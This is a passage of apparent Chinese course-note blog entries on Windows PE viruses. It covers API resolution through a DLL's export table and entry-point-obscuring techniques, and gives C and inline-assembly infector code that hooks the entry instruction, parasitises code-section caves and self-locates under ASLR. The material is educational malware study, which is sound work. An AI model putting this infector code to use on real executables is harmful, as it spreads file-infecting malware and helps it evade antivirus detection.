DOS头的e_lfanew字段内存地址（base+0x3C）</span></span><br><span class="line">    mov ebx, [ebx];<span class="comment">//ebx: NT头的RVA的值</span></span><br><span class="line">    add ebx, edi;             <span class="comment">//ebx: NT头的内存地址（RVA + base）</span></span><br><span class="line">    </span><br><span class="line">    add ebx, OFFSET_NTHDR_EXPORT_DIR  <span class="comment">//ebx: 导出表RVA字段的内存地址</span></span><br><span class="line">    mov ebx, [ebx];<span class="comment">//ebx: 导出表的RVA值</span></span><br><span class="line">    add ebx, edi;<span class="comment">//ebx: 导出表的内存地址（RVA + base）</span></span><br><span class="line">    </span><br><span class="line">    mov ecx, ebx;<span class="comment">//ecx: 导出表内存地址</span></span><br><span class="line">    add ecx, OFFSET_NAME_NUM_EXPORT <span class="comment">//ecx: 导出表中函数名数目字段的内存地址</span></span><br><span class="line">    mov ecx, [ecx];  <span class="comment">//ecx: 函数名数目的值，即设置好了循环次数</span></span><br><span class="line">    </span><br><span class="line">    mov edx, ebx;    <span class="comment">//edx: 导出表内存地址</span></span><br><span class="line">    add edx, OFFSET_NAME_PTR_EXPORT  <span class="comment">//edx: 函数名指针表RVA字段的内存地址</span></span><br><span class="line">    mov edx, [edx];           <span class="comment">//edx: 函数名指针表RVA的值</span></span><br><span class="line">    add edx, edi;             <span class="comment">//edx: 函数名指针表的内存地址（RVA+base）</span></span><br><span class="line"></span><br><span class="line">    push <span class="number">0</span>;       <span class="comment">//找到函数名，就放其在函数名指针表的索引i，初始为0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//以下循环比较函数名字符串</span></span><br><span class="line">;<span class="comment">//ebx 导出表内存地址 ecx 函数名数目的值 edx 函数名指针表内存地址 edi DLL基址</span></span><br><span class="line"></span><br><span class="line">find_proc_loop:</span><br><span class="line">    mov esi, [edx]; <span class="comment">//esi: 获得函数名指标表当前项的值，即函数名字符串的RVA的值</span></span><br><span class="line">    add esi, edi;   <span class="comment">//esi: 获得函数名字符串的内存地址</span></span><br><span class="line">    ;<span class="comment">//传参，调用我们之前写的strcompare函数</span></span><br><span class="line">    ;<span class="comment">//第1和第2个参数为两个字符串，第3个参数为字符串长度，参数从右往左传</span></span><br><span class="line">    push [ebp + <span class="number">10</span>h];    <span class="comment">//压栈字符串长度</span></span><br><span class="line">    push esi;       <span class="comment">//压栈字符串2，函数名指针表项指向的字符串</span></span><br><span class="line">    push [ebp + <span class="number">0</span>ch];   <span class="comment">//压栈字符串1，需要查找的函数名</span></span><br><span class="line">    call strcompare       <span class="comment">//字符串比较，调用完后清栈</span></span><br><span class="line">    test eax, eax         <span class="comment">//字符串比较结果，相等eax为1</span></span><br><span class="line">    jnz find_proc_found   <span class="comment">//找到了，跳转</span></span><br><span class="line">    add edx, <span class="number">4</span>            <span class="comment">//没找到，edx指向下一个函数名指针表的表项</span></span><br><span class="line">    mov eax, [esp]        <span class="comment">//调用完strcmp后，esp指向之前的push 0，所以[esp]是循环值i</span></span><br><span class="line">    inc eax      <span class="comment">//i++</span></span><br><span class="line">    mov [esp], eax         <span class="comment">//继续在esp存循环变量的值，也是当前项的索引</span></span><br><span class="line">    dec ecx;         <span class="comment">//循环次数减1</span></span><br><span class="line">    jnz find_proc_loop <span class="comment">//ecx不为0，继续遍历</span></span><br><span class="line">    pop eax;   <span class="comment">//没找到，清除栈内i，平衡栈</span></span><br><span class="line">    <span class="keyword">xor</span> eax, eax; <span class="comment">//eax置0，表示未找到</span></span><br><span class="line">    jmp find_proc_end</span><br><span class="line">find_proc_found</span><br><span class="line">     ……</span><br><span class="line">find_proc_end</span><br><span class="line">     …… <span class="comment">//平衡栈的相关操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//以下为找到字符串后获取函数地址</span></span><br><span class="line">;<span class="comment">//eax 所查找函数名在函数名指针表的索引i </span></span><br><span class="line">;<span class="comment">//ebx 导出表内存地址</span></span><br><span class="line">;<span class="comment">//edi DLL基址</span></span><br><span class="line"></span><br><span class="line">find_proc_found:</span><br><span class="line">  pop eax;  <span class="comment">//获得函数名指针表的索引</span></span><br><span class="line">  </span><br><span class="line">  mov edx, ebx;    <span class="comment">//edx: 导出表内存地址</span></span><br><span class="line">  add edx, OFFSET_ORDINAL_EXPORT;  <span class="comment">//edx: 序号表RVA字段的内存地址</span></span><br><span class="line">  mov edx, [edx];<span class="comment">//edx: 序号表RVA的值</span></span><br><span class="line">  add edx, edi;          <span class="comment">//edx: 序号表的内存地址（RVA + base）</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//序号表每项2字节，第i项为eax * 2,lea指令将该项的地址放入edx</span></span><br><span class="line">  lea edx, [edx + eax * <span class="number">2</span>]; </span><br><span class="line">  <span class="keyword">xor</span> eax, eax</span><br><span class="line">  mov ax, [edx];     <span class="comment">//eax: 序号表中对应项的值，即为函数地址表的索引值,注意只放2字节</span></span><br><span class="line">  </span><br><span class="line">  mov edx, ebx; <span class="comment">//edx: 导出表内存地址</span></span><br><span class="line">  add edx, OFFSET_PROC_PTR_EXPORT;  <span class="comment">//ebx: 函数地址表RVA字段的内存地址</span></span><br><span class="line">  mov edx, [edx];       <span class="comment">//ebx: 函数地址表的RVA的值</span></span><br><span class="line">  add edx, edi;       <span class="comment">//ebx: 函数地址表的内存地址（RVA + base）</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//函数地址表每项4字节，eax为函数地址表的索引值，获得对应项的地址</span></span><br><span class="line">  lea eax, [edx + eax * <span class="number">4</span>];  </span><br><span class="line">  mov eax, [eax];   <span class="comment">//eax: 函数地址表中对应项的值，即为函数入口RVA的值</span></span><br><span class="line">  add eax, edi;     <span class="comment">//eax: 所查找函数的内存地址（RVA + base）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Main函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argC, <span class="keyword">char</span> ** args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   OLECHAR * s1 = L“USER32.dll”;   <span class="comment">//DLL名字</span></span><br><span class="line">   <span class="keyword">void</span> * p = MessageBox;         <span class="comment">//函数名字</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> base;         <span class="comment">//DLL基址</span></span><br><span class="line">   <span class="comment">//将前面写的获取DLL基址的汇编代码封装成函数，传参分别是DLL名字和DLL名字的长度</span></span><br><span class="line">   <span class="comment">//注意名字长度为Unicode码，一个字符占2个字节</span></span><br><span class="line">   base = getDllBaseW((<span class="keyword">char</span> *)s1, <span class="number">20</span>);  </span><br><span class="line">   <span class="built_in">printf</span>(“user32.dll base address is %x\n”, base); <span class="comment">//打印获得的DLL基址</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;messagebox address is %x\n&quot;</span>, </span><br><span class="line">        getProcEntry((<span class="keyword">char</span> *)base, “ActivateKeyboardLayout”, <span class="number">22</span>)); <span class="comment">//打印函数地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="将finddll和getproc函数放入寄生的病毒代码"><a class="markdownIt-Anchor" href="#将finddll和getproc函数放入寄生的病毒代码"></a> 将finddll和getproc函数放入寄生的病毒代码</h3><p>数据区改进：</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-DLL-%E5%AF%BC%E5%87%BA%E8%A1%A8/image-20210519211017574.png" alt="image-20210519211017574" /></p><p>增加的代码是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//填写user32.dll的unicode串</span></span><br><span class="line">OLECHAR * s1 = L“USER32.dll”;  <span class="comment">//unicode码</span></span><br><span class="line"><span class="comment">//user32.dll放到寄生代码数据区偏移24字节处</span></span><br><span class="line"><span class="built_in">memcpy</span>(virusData + <span class="number">24</span>, s1, <span class="number">20</span>);</span><br><span class="line"><span class="comment">//MessageBoxA放到寄生代码数据区偏移44字节处</span></span><br><span class="line"><span class="built_in">strcpy</span>(virusData + <span class="number">44</span>, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br></pre></td></tr></table></figure><p>程序设计图：</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-DLL-%E5%AF%BC%E5%87%BA%E8%A1%A8/image-20210519211156523.png" alt="image-20210519211156523" /></p><h2 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h2><ol><li>关于导出表的说法，以下正确的是（     ）<br />A. 函数地址表中存放的是函数入口VA（RVA）<br />B. 导入表中具有函数名表，通过函数名表的索引直接就可以定位到函数地址表中相应的项<br />C. DLL中所有的函数都有函数名和序号<br />D. 序号表中存储的是函数的序号<br />E. 以上都不正确</li></ol><p>参考答案：E</p><p>解析：</p><p>A. 函数地址表中存的是函数的入口地址；</p><p>B. 通过函数名表索引定位函数地址索引表索引，再根据函数地址索引表内容定位函数地址表的索引；</p><p>C. 有的函数名不暴露；</p><p>D. 序号表存的是函数名表和函数地址表的对应关系</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;如何让病毒调用系统的api函数&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#如何让病毒调用系统的api函数&quot;&gt;&lt;/a&gt; 如何让病毒调用系统的API函数&lt;/h2&gt;
&lt;h3 id=&quot;如何获取api的入口地址&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#如何获取api的入口地址&quot;&gt;&lt;/a&gt; 如何获取API的入口地址&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;找到提供这个API函数的DLL的加载基址&lt;/li&gt;
&lt;li&gt;从DLL的导出表中拿到API函数地址&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>病毒_Win_EPO入口点不在代码节的问题</title>
    <link href="https://wsw8.online/archives/287848c5.html"/>
    <id>https://wsw8.online/archives/287848c5.html</id>
    <published>2021-05-19T01:43:26.000Z</published>
    <updated>2021-05-19T10:05:02.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="入口点模糊技术"><a class="markdownIt-Anchor" href="#入口点模糊技术"></a> 入口点模糊技术</h2><p>Entry Point Obscuring（EPO）：</p><ol><li>EPO是病毒代码隐藏自己入口点，避免被查杀的一种技术</li><li>EPO使得被病毒修改的入口点看起来依然像是正常的入口点</li></ol><span id="more"></span><h3 id="解决入口点不在代码段问题"><a class="markdownIt-Anchor" href="#解决入口点不在代码段问题"></a> 解决入口点不在代码段问题</h3><ol><li>不感染最后一节，直接感染代码节，病毒代码依附在代码节的尾部，再修改入口点，这样虽然修改了入口点，但是入口点在代码节</li><li>不修改入口点但将入口点所在指令替换成一条JMP指令，跳到寄生的病毒代码</li></ol><h3 id="epo1-感染在代码节的空洞"><a class="markdownIt-Anchor" href="#epo1-感染在代码节的空洞"></a> EPO1 感染在代码节的空洞</h3><h4 id="程序设计"><a class="markdownIt-Anchor" href="#程序设计"></a> 程序设计</h4><p><img src="/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519163430182.png" alt="image-20210519163430182" /></p><h4 id="和之前的不同"><a class="markdownIt-Anchor" href="#和之前的不同"></a> 和之前的不同</h4><blockquote><p>以前是获得最后一个节</p><p>现在是获得第一个代码节</p></blockquote><h4 id="找代码节的方法"><a class="markdownIt-Anchor" href="#找代码节的方法"></a> 找代码节的方法</h4><blockquote><ol><li>遍历所有节表项</li><li>判断节表项的属性里是否有0x00000020属性（代码节）</li></ol></blockquote><h4 id="代码"><a class="markdownIt-Anchor" href="#代码"></a> 代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//遍历所有节表项寻找代码节</span></span><br><span class="line"><span class="keyword">int</span> sectionNum = ntHdrs.FileHeader.NumberOfSections;</span><br><span class="line">IMAGE_SECTION_HEADER infectedSectionHdr;    <span class="comment">//变量，存节表项</span></span><br><span class="line"><span class="keyword">bool</span> found = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sectionNum; i++)&#123;</span><br><span class="line">  fread(&amp;infectedSectionHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);   <span class="comment">//每次读一个节头</span></span><br><span class="line">  <span class="comment">//通过characteristics字段判断是否为代码节</span></span><br><span class="line">  <span class="keyword">if</span> ((infectedSectionHdr.Characteristics &amp; <span class="number">0x00000020</span>) == <span class="number">0x00000020</span>) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//判断文件中代码节的空洞是否足够</span></span><br><span class="line">    <span class="keyword">if</span> (infectedSectionHdr.SizeOfRawData - infectedSectionHdr.Misc.VirtualSize &lt;CODE_SIZE)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;the code section has not enough space to save virus\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   found = <span class="literal">true</span>;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!found)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;cannot find code section\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="epo2-感染最后节替换入口指令"><a class="markdownIt-Anchor" href="#epo2-感染最后节替换入口指令"></a> EPO2 感染最后节，替换入口指令</h3><h4 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h4><ol><li>先将原入口5字节保存</li><li>替换成JMP跳到寄生代码</li><li>病毒执行后将入口的5字节还原</li><li>然后跳到原入口</li></ol><h4 id="图示"><a class="markdownIt-Anchor" href="#图示"></a> 图示</h4><p><img src="/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519165604094.png" alt="image-20210519165604094" /></p><h4 id="getcode函数设计"><a class="markdownIt-Anchor" href="#getcode函数设计"></a> getCode函数设计</h4><p><img src="/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519170847754.png" alt="image-20210519170847754" /></p><p>关于最后的数据区</p><blockquote><p>数据区需要保存被覆盖的5个字节</p><p>需要保存数据区起始地址4个字节</p><p>需要保存原程序入口地址4个字节</p><p>共13字节</p></blockquote><p>函数参数</p><blockquote><ol><li>原入口点RVA——AddressOfEntryPoint</li><li>病毒寄生位置RVA——起始RVA+virtualSize</li><li>原程序预期加载地址——ImageBase</li><li>存被覆盖5个字节的字符数组</li><li>代码</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">char</span> * code = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(virusSize);   <span class="comment">//为内嵌汇编分配内存</span></span><br><span class="line"><span class="built_in">memcpy</span>(code, (<span class="keyword">void</span> *)virusStart, virusSize);   <span class="comment">//将内嵌汇编代码拷贝到该内存区域</span></span><br><span class="line"><span class="comment">//由传递的参数计算需要放到寄生病毒数据区的值：预期的病毒数据区内存地址、预期的原入口点</span></span><br><span class="line"><span class="keyword">long</span> expectedVirusDataAddress = imageBase + virusStartRVA + <span class="number">5</span>; <span class="comment">//5为数据区前面的call指令</span></span><br><span class="line"><span class="keyword">long</span> oldEntryAddress = imageBase + oldEntryRVA;</span><br><span class="line"><span class="comment">//定位到寄生病毒代码的数据区</span></span><br><span class="line"><span class="keyword">char</span> * virusData = code + <span class="number">5</span>;</span><br><span class="line">*(<span class="keyword">long</span> *)(virusData + <span class="number">5</span>) = expectedVirusDataAddress;<span class="comment">//写入数据区的第二个数据</span></span><br><span class="line">*(<span class="keyword">long</span> *)(virusData + <span class="number">5</span> + <span class="number">4</span>) = oldEntryAddress;<span class="comment">//写入数据区的第三个数据</span></span><br><span class="line"><span class="comment">//写入被覆盖的5个字节（由函数参数oldEntryBytes获得）到数据区的第一个数据</span></span><br><span class="line">*(<span class="keyword">long</span> *)virusData = *(<span class="keyword">long</span> *)oldEntryBytes;  <span class="comment">//写入前4个字节</span></span><br><span class="line">*(virusData + <span class="number">4</span>) = *(oldEntryBytes + <span class="number">4</span>);<span class="comment">//写入第5个字节</span></span><br><span class="line"><span class="comment">//生成最后的JMP指令</span></span><br><span class="line"><span class="keyword">char</span> * jmpPtr = code + virusSize - <span class="number">5</span>;<span class="comment">//定位到寄生代码中的JMP指令</span></span><br><span class="line">* jmpPtr = <span class="number">0xe9</span>; <span class="comment">//先放JMP指令的机器码</span></span><br><span class="line">jmpPtr++;<span class="comment">//定位到JMP指令的偏移量部分</span></span><br><span class="line">*(<span class="keyword">long</span> *)jmpPtr = oldEntryRVA - (virusStartRVA + virusSize); <span class="comment">//写入JMP指令的偏移量</span></span><br><span class="line"><span class="keyword">return</span> code;</span><br><span class="line">......</span><br></pre></td></tr></table></figure></blockquote><p>关键问题</p><blockquote><p>ImageBase是程序预期的加载基地址，但是win7和vs编译器往往采用了随机地址空间技术，所以我们需要自定位技术</p></blockquote><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">getCode</span><span class="params">( … )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">long</span> virusStart, virusEnd;</span><br><span class="line"><span class="keyword">int</span> virusSize;</span><br><span class="line">_asm&#123;</span><br><span class="line">mov virusStart, offset virus_start; <span class="comment">//获取病毒代码起始偏移</span></span><br><span class="line">mov virusEnd, offset virus_end;   <span class="comment">//获取病毒代码结束偏移</span></span><br><span class="line">&#125;</span><br><span class="line">virusSize = virusEnd - virusStart;  <span class="comment">//获取病毒代码长度</span></span><br><span class="line"><span class="keyword">if</span> (oldEntryBytes == Null)</span><br><span class="line">                      <span class="keyword">return</span> (<span class="keyword">char</span> *)virusSize;</span><br><span class="line"></span><br><span class="line">               …..  <span class="comment">//这部分代码处理内嵌汇编无法处理的部分</span></span><br><span class="line"></span><br><span class="line">virus_start:    <span class="comment">//病毒代码起始标号</span></span><br><span class="line">   _asm&#123;               <span class="comment">//这段嵌入汇编是需要寄生的病毒代码</span></span><br><span class="line">               call yy; <span class="comment">//跳过数据区并且把数据区实际地址压栈</span></span><br><span class="line">data:</span><br><span class="line"><span class="comment">//5字节被覆盖的数据</span></span><br><span class="line">nop;  </span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line"><span class="comment">//预期的数据区地址4字节</span></span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line"><span class="comment">//预期的原入口点地址4字节</span></span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line"></span><br><span class="line">yy:</span><br><span class="line"><span class="comment">//pop eax;  //执行后eax寄存器存放了病毒数据区data的实际地址</span></span><br><span class="line">        jmp xx;<span class="comment">//模拟的有效代码</span></span><br><span class="line">nop;<span class="comment">//病毒行为</span></span><br><span class="line">nop;</span><br><span class="line">xx:</span><br><span class="line">                              <span class="comment">//push ebx;//恢复被覆盖的5个字节 </span></span><br><span class="line">    pop eax;  <span class="comment">//eax为数据区实际地址</span></span><br><span class="line">push ebx;       </span><br><span class="line">push ecx;</span><br><span class="line">mov ebx, eax;         <span class="comment">//eax用来访问实际数据，ebx存实际地址</span></span><br><span class="line">sub ebx, [eax + <span class="number">5</span>];    <span class="comment">//ebx得到加载偏差 = 实际地址 – 预期地址</span></span><br><span class="line">mov ecx, [eax + <span class="number">9</span>];       <span class="comment">//访问数据区得到入口的预期地址</span></span><br><span class="line">add ecx, ebx;            <span class="comment">//获得入口点实际地址</span></span><br><span class="line">;恢复<span class="number">5</span>字节被覆盖的代码</span><br><span class="line"><span class="comment">//恢复入口被覆盖的5个字节内容</span></span><br><span class="line">               <span class="comment">//利用ebx先恢复前4字节</span></span><br><span class="line">mov ebx, [eax];     <span class="comment">//数据区开始的4个字节放入ebx</span></span><br><span class="line">mov [ecx], ebx;     <span class="comment">//ecx是原入口的实际地址，完成前4个字节的恢复</span></span><br><span class="line"><span class="comment">//利用bl再恢复最后一字节</span></span><br><span class="line">mov bl, [eax + <span class="number">4</span>];    </span><br><span class="line">mov byte ptr [ecx + <span class="number">4</span>], bl; </span><br><span class="line">pop ecx</span><br><span class="line">pop ebx;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后5字节最后一条JMP指令的代码占位</span></span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">virus_end:    <span class="comment">//病毒代码结束标号</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="感染代码设计"><a class="markdownIt-Anchor" href="#感染代码设计"></a> 感染代码设计</h3><h4 id="图示-2"><a class="markdownIt-Anchor" href="#图示-2"></a> 图示</h4><p><img src="/images/%E7%97%85%E6%AF%92-Win-EPO%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E9%97%AE%E9%A2%98/image-20210519173947160.png" alt="image-20210519173947160" /></p><p>关键：</p><ol><li>找到入口点所在的节</li><li>将入口点（内存位置）转变为文件位置</li></ol><h4 id="代码-2"><a class="markdownIt-Anchor" href="#代码-2"></a> 代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argC, <span class="keyword">char</span> ** args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">readHdrs(fp);<span class="comment">//读NT头道ntHdrs</span></span><br><span class="line"><span class="keyword">int</span> sectionNum = ntHdrs.FileHeader.NumberOfSections;   <span class="comment">//NT头-文件头-NumberOfSections</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> entry = ntHdrs.OptionalHeader.AddressOfEntryPoint;  <span class="comment">//入口点的值（是RVA）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历节判断入口点在哪个节</span></span><br><span class="line"><span class="comment">//判断条件：当前节的RVA(VirtualAdress)&lt;=入口点&lt;=当前节的RVA+该节的VirtualSize</span></span><br><span class="line">IMAGE_SECTION_HEADER lastSectionHdr, curHdr;  <span class="comment">//两个变量：最后一个节头，当前节头 </span></span><br><span class="line"><span class="keyword">long</span> entryDiskOffset;        <span class="comment">//入口点在文件偏移</span></span><br><span class="line"><span class="keyword">int</span> entryOffsetToSectionStart;  <span class="comment">//入口点在节内偏移</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sectionNum; i++)</span><br><span class="line">&#123;</span><br><span class="line">    fread(&amp;curHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);</span><br><span class="line">    <span class="comment">//查找入口点所在的节，找到就获得入口点的文件偏移</span></span><br><span class="line">    <span class="keyword">if</span> ((entry &gt;= curHdr.VirtualAddress) &amp;&amp; (entry &lt;= curHdr.VirtualAddress +   </span><br><span class="line">                                                                curHdr.Misc.VirtualSize))</span><br><span class="line">    &#123;</span><br><span class="line">      entryOffsetToSectionStart = entry - curHdr.VirtualAddress; <span class="comment">//注意VirtualAddress为节起始RVA</span></span><br><span class="line">      entryDiskOffset = curHdr.PointerToRawData + entryOffsetToSectionStart;<span class="comment">//获得入口点文件偏移</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//循环结束时，curHdr指向最后一个节头</span></span><br><span class="line">lastSectionHdr = curHdr;</span><br><span class="line"><span class="keyword">int</span> codeSize = (<span class="keyword">int</span>)getCode(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);  <span class="comment">//这里调用了getCode函数的第二种功能</span></span><br><span class="line"><span class="comment">//判断最后一个节是否有空洞寄生</span></span><br><span class="line"><span class="keyword">if</span> (lastSectionHdr.SizeOfRawData - lastSectionHdr.Misc.VirtualSize &lt; codeSize)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the last section has not enough space to save virus\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此时文件指针正好读完最后一个节头，先改最后一个节的VirtualSize字段，减少文件定位操作</span></span><br><span class="line">fseek(fp, - <span 